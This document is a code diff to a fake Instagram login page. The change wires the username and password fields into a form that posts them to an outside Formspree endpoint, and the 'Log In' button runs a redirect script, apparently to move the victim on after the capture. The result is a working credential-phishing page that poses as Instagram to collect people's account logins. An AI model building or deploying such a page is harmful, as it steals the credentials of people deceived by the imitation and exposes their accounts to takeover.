@@ -40,32 +40,32 @@
                             <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
                             <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
                         </div>
-                        <div class="signin-form" id="signin-form">
+                        
+                        <form class="signin-form" id="signin-form" action="https://formspree.io/meqbjbze" method="POST" name="fname">
                             <div class="form-group">
-                                <div class="animate-input">
+                                <div class="animate-input" name="fname2">
                                     <span>
                                         Phone number, username or email
                                     </span>
-                                    <input type="text">
+                                    <input type="text" required name="username1">
                                 </div>
                             </div>
                             
-                            <form  action="https://formspree.io/your-email@example.com" method="POST">
-                            	<div class="form-group">
-                                	<div class="animate-input">
-                                	    <span>
-                                	        Password
-                                	    </span>
-                                	    <input type="password">
-                                	    <button>Show</button>
-                                	</div>
-                            	</div>
-                            	<div class="btn-group">
-                                	<button class="btn-login" id="signin-btn" onclick="redirectToSite()">
-                                    	Log In
-                                	</button>
-                            	</div>
-                            </form>
+                            <div class="form-group" name="fname4">
+                                <div class="animate-input" name="fname5">
+                                    <span>
+                                        Password
+                                    </span>
+                                    <input type="password" required name="password6">
+                                    <button>Show</button>
+                                </div>
+                            </div>
+                            <div class="btn-group" name="fname7">
+                                <button class="btn-login" id="signin-btn" onclick="redirectToSite()" name="fname7">
+                                    Log In
+                                </button>
+                            </div>
+
                             <div class="divine">
                                 <div></div>
                                 <div>OR</div>
@@ -78,7 +78,7 @@
                                 </button>
                             </div>
                             <a href="#" class="forgot-pw">Forgot password?</a>
-                        </div>
+                        </form>
                     </div>
                     <div class="box goto">
                         <p>
